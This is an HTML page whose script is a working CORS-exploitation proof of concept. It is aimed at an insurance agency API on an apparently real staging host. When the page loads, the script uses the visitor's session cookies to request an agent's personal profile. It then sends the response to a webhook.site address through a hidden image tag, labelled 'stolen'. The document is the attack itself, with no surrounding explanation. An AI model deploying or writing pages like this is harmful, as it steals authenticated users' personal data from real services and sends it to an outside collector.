<!DOCTYPE html>
<html>
<body>
<script>
console.log("Script started!");

fetch('https://apis.uat.aia-apps.com/ketnoi/api/profile/agency-personal-information/get-detail-profile', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json',
        'Channel': 'AGT'
    },
    body: JSON.stringify({
        "producerCode": "330080185"
    })
})
.then(response => {
    console.log("Got response:", response.status);
    return response.text();
})
.then(data => {
    console.log("Response data:", data);
    
    // Use invisible image tag to exfiltrate data - bypasses CORS
    const img = new Image();
    img.src = `https://webhook.site/c3524cd7-654a-4899-aeca-fd4675347fd1?stolen=${encodeURIComponent(data)}&timestamp=${encodeURIComponent(new Date().toISOString())}&source=cors_exploit`;
    
    // Optional: Add to DOM for debugging (you can remove this)
    img.style.display = 'none';
    document.body.appendChild(img);
    
    console.log("Data exfiltrated via image tag");
})
.catch(err => console.log('Main request failed:', err));

console.log("Script finished setup!");
</script>
</body>
</html>
